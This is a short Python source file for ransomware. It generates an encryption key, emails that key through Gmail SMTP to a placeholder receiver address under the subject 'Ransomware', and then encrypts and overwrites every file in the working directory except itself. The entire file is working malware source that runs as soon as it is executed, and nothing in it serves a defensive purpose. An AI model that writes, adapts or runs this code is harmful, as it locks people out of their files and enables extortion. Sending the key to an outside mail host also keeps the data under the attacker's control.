from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import os


def sendMail(key):
    #message body
    message = MIMEMultipart()
    message["From"] = "sender"        
    message["To"] = "receiver"         
    message["Subject"] = "Ransomware"

    body = f"""

    Key -> {key}

    """

    body_text = MIMEText(body, "plain")  
    message.attach(body_text)

    #mail account info
    myMailAdress = "enter_sender_mail"
    password = "enter_mail_password"
    sendTo = "receiver_mail"

    #send mail
    mail = smtplib.SMTP("smtp.gmail.com",587)          
    mail.ehlo()
    mail.starttls()
    mail.login(myMailAdress, password)
    mail.sendmail( message["From"], message["To"], message.as_string())


def startAttack():
    file_list = []
    for files in os.listdir():
        if files == "ransomware.py":
            continue
        if os.path.isfile(files):
            file_list.append(files)

    for file in file_list:
        with open(file,"rb") as the_file:
            contents = the_file.read()
        contents_encryted = Fernet(key).encrypt(contents)
        with open(file,"wb") as the_file:
            the_file.write(contents_encryted)

key = Fernet.generate_key()
sendMail(key)
startAttack()